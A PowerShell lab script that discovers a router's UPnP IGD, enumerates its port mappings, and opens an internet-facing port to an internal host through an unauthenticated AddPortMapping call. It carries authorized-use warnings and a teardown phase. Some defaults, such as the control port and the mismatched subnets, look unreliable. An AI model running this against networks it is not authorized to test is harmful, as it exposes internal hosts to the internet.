<#
.SYNOPSIS
    UPnP IGD exposure lab: discovery, unauthenticated port-mapping PoC,
    external verification, and teardown.

.DESCRIPTION
    Demonstrates that an enabled UPnP IGD accepts unauthenticated SOAP
    requests from any LAN device, including AddPortMapping, which opens an
    internet-facing port to an internal host with no credentials.

    AUTHORIZED USE ONLY. Run only against a network and devices you own or
    are explicitly permitted to test. The PoC opens a port to the internet
    with a short lease and always tears it down. You are responsible for use.

.NOTES
    Run from an elevated (Administrator) PowerShell window.
    Requires nmap on PATH for the discovery phase (optional).

.EXAMPLE
    .\upnp-lab.ps1 -Phase Discover
    .\upnp-lab.ps1 -Phase Enumerate
    .\upnp-lab.ps1 -Phase Exploit
    .\upnp-lab.ps1 -Phase Listen
    .\upnp-lab.ps1 -Phase Teardown
#>

[CmdletBinding()]
param(
    [ValidateSet('Discover','Enumerate','Exploit','Listen','Teardown')]
    [string]$Phase = 'Enumerate',

    # Router LAN IP (gateway). Find with: ipconfig  (Default Gateway)
    [string]$Gateway = '192.168.68.1',

    # IGD control path from rootDesc.xml (WANIPConnection controlURL).
    # This is device-specific. Get it from the Discover phase output.
    [string]$ControlPath = '/ctl/IPConn',

    # Your test host's LAN IP. Find with: ipconfig  (IPv4 Address)
    [string]$HostIp = '192.168.1.100',

    [int]$ExternalPort = 18080,
    [int]$InternalPort = 8080,
    [int]$LeaseSeconds = 3600
)

$svc = 'urn:schemas-upnp-org:service:WANIPConnection:1'
$ctl = "http://$($Gateway):1900$ControlPath"

function Send-Upnp {
    param([string]$Action, [string]$Inner = '')
    $body = @"
<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body><u:$Action xmlns:u="$svc">$Inner</u:$Action></s:Body>
</s:Envelope>
"@
    $resp = Invoke-WebRequest -Uri $ctl -Method Post -Body $body -UseBasicParsing `
        -ContentType 'text/xml; charset="utf-8"' `
        -Headers @{ SOAPAction = "`"$svc#$Action`"" }
    [xml]$resp.Content
}

switch ($Phase) {

    'Discover' {
        Write-Host "[*] SSDP / IGD discovery on $Gateway" -ForegroundColor Cyan
        Write-Host "    Looking for 1900/udp and the UPnP service banner..."
        $nmap = (Get-Command nmap -ErrorAction SilentlyContinue).Source
        if ($nmap) {
            & $nmap -sU -p 1900 --script upnp-info $Gateway
        } else {
            Write-Warning "nmap not found on PATH. Install it, or open http://$($Gateway):1900/rootDesc.xml in a browser."
        }
        Write-Host "`n[*] Then read rootDesc.xml and note the WANIPConnection <controlURL>." -ForegroundColor Cyan
        Write-Host "    Open: http://$($Gateway):1900/rootDesc.xml  (path may vary by device)"
    }

    'Enumerate' {
        Write-Host "[*] Unauthenticated info disclosure: GetExternalIPAddress" -ForegroundColor Cyan
        $ip = (Send-Upnp 'GetExternalIPAddress').Envelope.Body.GetExternalIPAddressResponse.NewExternalIPAddress
        Write-Host "    Public IP returned with no auth: $ip" -ForegroundColor Yellow

        Write-Host "`n[*] Walking the port-mapping table" -ForegroundColor Cyan
        $i = 0; $maps = @()
        while ($true) {
            try {
                $e = (Send-Upnp 'GetGenericPortMappingEntry' "<NewPortMappingIndex>$i</NewPortMappingIndex>").Envelope.Body.GetGenericPortMappingEntryResponse
                $maps += [pscustomobject]@{
                    Idx      = $i
                    ExtPort  = $e.NewExternalPort
                    Proto    = $e.NewProtocol
                    Internal = "$($e.NewInternalClient):$($e.NewInternalPort)"
                    Desc     = $e.NewPortMappingDescription
                    LeaseSec = $e.NewLeaseDuration
                }
                $i++
            } catch { break }
        }
        if ($maps) { $maps | Format-Table -AutoSize }
        else       { Write-Host "    No active UPnP port mappings (clean baseline)." -ForegroundColor Green }
    }

    'Exploit' {
        Write-Host "[*] Allowing inbound on $InternalPort locally (temp firewall rule)" -ForegroundColor Cyan
        New-NetFirewallRule -DisplayName "UPnP-Lab-$InternalPort" -Direction Inbound `
            -Protocol TCP -LocalPort $InternalPort -Action Allow -Profile Private | Out-Null

        Write-Host "[*] Unauthenticated AddPortMapping: ext $ExternalPort -> $($HostIp):$InternalPort (lease ${LeaseSeconds}s)" -ForegroundColor Cyan
        $inner = "<NewRemoteHost></NewRemoteHost><NewExternalPort>$ExternalPort</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>$InternalPort</NewInternalPort><NewInternalClient>$HostIp</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>UPnP-Lab</NewPortMappingDescription><NewLeaseDuration>$LeaseSeconds</NewLeaseDuration>"
        Send-Upnp 'AddPortMapping' $inner | Out-Null

        $e = (Send-Upnp 'GetGenericPortMappingEntry' "<NewPortMappingIndex>0</NewPortMappingIndex>").Envelope.Body.GetGenericPortMappingEntryResponse
        Write-Host "    Mapping confirmed:" -ForegroundColor Yellow
        $e | Format-List NewExternalPort, NewProtocol, NewInternalClient, NewInternalPort, NewLeaseDuration
        Write-Host "[*] Now run:  .\upnp-lab.ps1 -Phase Listen   then test from an external device." -ForegroundColor Cyan
    }

    'Listen' {
        Write-Host "[*] Listening on 0.0.0.0:$InternalPort. Test from a device OFF this network." -ForegroundColor Cyan
        Write-Host "    Leave this window open. Ctrl+C to stop.`n"
        $l = [System.Net.Sockets.TcpListener]::new([ipaddress]::Any, $InternalPort); $l.Start()
        try {
            while ($true) {
                $c = $l.AcceptTcpClient(); $s = $c.GetStream()
                $buf = New-Object byte[] 4096; $n = $s.Read($buf, 0, 4096)
                $line = [Text.Encoding]::ASCII.GetString($buf, 0, $n).Split("`n")[0].Trim()
                Write-Host ("{0}  from {1}  {2}" -f (Get-Date -f T), $c.Client.RemoteEndPoint, $line) -ForegroundColor Yellow
                $msg = "UPnP lab test: reached via an unauthenticated UPnP port mapping"
                $b = [Text.Encoding]::ASCII.GetBytes("HTTP/1.1 200 OK`r`nContent-Type: text/plain`r`nContent-Length: $($msg.Length)`r`nConnection: close`r`n`r`n$msg")
                $s.Write($b, 0, $b.Length); $c.Close()
            }
        } finally { $l.Stop() }
    }

    'Teardown' {
        Write-Host "[*] Removing mapping ext $ExternalPort/TCP" -ForegroundColor Cyan
        Send-Upnp 'DeletePortMapping' "<NewRemoteHost></NewRemoteHost><NewExternalPort>$ExternalPort</NewExternalPort><NewProtocol>TCP</NewProtocol>" | Out-Null

        Write-Host "[*] Removing temp firewall rule" -ForegroundColor Cyan
        Remove-NetFirewallRule -DisplayName "UPnP-Lab-$InternalPort" -ErrorAction SilentlyContinue

        try {
            $e = (Send-Upnp 'GetGenericPortMappingEntry' "<NewPortMappingIndex>0</NewPortMappingIndex>").Envelope.Body.GetGenericPortMappingEntryResponse
            Write-Warning "STILL PRESENT: ext $($e.NewExternalPort) -> $($e.NewInternalClient):$($e.NewInternalPort)"
        } catch {
            Write-Host "    Clean: no mappings remain." -ForegroundColor Green
        }
    }
}
